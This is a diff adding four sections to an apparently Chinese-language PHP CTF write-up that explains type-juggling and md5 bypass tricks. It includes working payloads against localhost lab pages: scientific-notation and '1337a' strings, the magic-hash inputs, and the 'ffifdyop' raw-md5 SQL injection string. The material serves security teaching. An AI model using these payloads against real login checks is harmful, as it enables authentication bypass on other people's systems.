@@ -198,3 +198,101 @@ echo  dechex ( 3735929054 ); // 将3735929054转为16进制
 ```
 构造：
 `http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0de`
+
+## 21 数字验证正则绕过
+
+`0 >= preg_match('/^[[:graph:]]{12,}$/', $password)`
+意为必须是12个字符以上（非空格非TAB之外的内容）
+
+```
+$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; 
+if (6 > preg_match_all($reg, $password, $arr)) 
+```
+意为匹配到的次数要大于6次
+
+```
+$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 
+foreach ($ps as $pt) 
+{ 
+    if (preg_match("/[[:$pt:]]+/", $password)) 
+        $c += 1; 
+} 
+if ($c < 3) break; 
+```
+意为必须要有大小写字母，数字，字符内容三种与三种以上
+
+```
+if ("42" == $password) echo $flag; 
+```
+意为必须等于`42`
+
+答案：
+```
+42.00e+00000000000 
+或
+420.000000000e-1
+```
+资料：
+
+- [安全宝「约宝妹」代码审计CTF题解](http://bobao.360.cn/learning/detail/248.html)
+
+- [各种版本PHP在线迷你运行脚本](https://3v4l.org/jYSpC)
+
+- [PHP Comparison Operators](http://php.net/manual/en/language.operators.comparison.php)
+
+## 22 弱类型整数大小比较绕过
+
+`is_numeric($temp)?die("no numeric"):NULL;`
+不能是数字
+
+```
+if($temp>1336){
+    echo $flag;
+} 
+```
+又要大于`1336`
+
+利用`PHP`弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型`intval`再比。如果输入一个`1337a`这样的字符串，在`is_numeric`中返回`true`，然后在比较时被转换成数字`1337`，这样就绕过判断输出`flag`。
+
+`http://127.0.0.1/php_bug/22.php?password=1337a`
+
+## 23 md5函数验证绕过
+
+`if(md5($temp)==0)`
+要使`md5`函数加密值为`0`
+
+- 方法一：
+使`password`不赋值，为`NULL`，`NULL == 0`为`true`
+`http://127.0.0.1/php_bug/23.php?password=`
+`http://127.0.0.1/php_bug/23.php`
+
+- 方法二：
+经过MD5运算后，为`0e******`的形式，其结果为`0*10`的`n`次方，结果还是零
+`http://127.0.0.1/php_bug/23.php?password=240610708`
+`http://127.0.0.1/php_bug/23.php?password=QNKCDZO`
+
+## 24 md5函数true绕过注入
+
+`$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";`
+`md5($password,true)`
+将`md5`后的`hex`转换成字符串
+
+如果包含`'or'xxx`这样的字符串，那整个`sql`变成
+
+`SELECT * FROM admin WHERE pass = ''or'xxx'`就绕过了
+
+字符串：`ffifdyop`
+
+`md5`后，`276f722736c95d99e921722cf9ed621c`
+`hex`转换成字符串：` 'or'6<trash>`
+![](./img/02.png)
+
+构造：`?password=ffifdyop`
+
+资料：
+
+- [MD5加密后的SQL 注入](http://blog.csdn.net/greyfreedom/article/details/45846137)
+
+- [敏感函数md5()](http://www.am0s.com/functions/204.html)
+
+- [php黑魔法](http://www.xmanblog.net/2017/04/04/php-magic/)
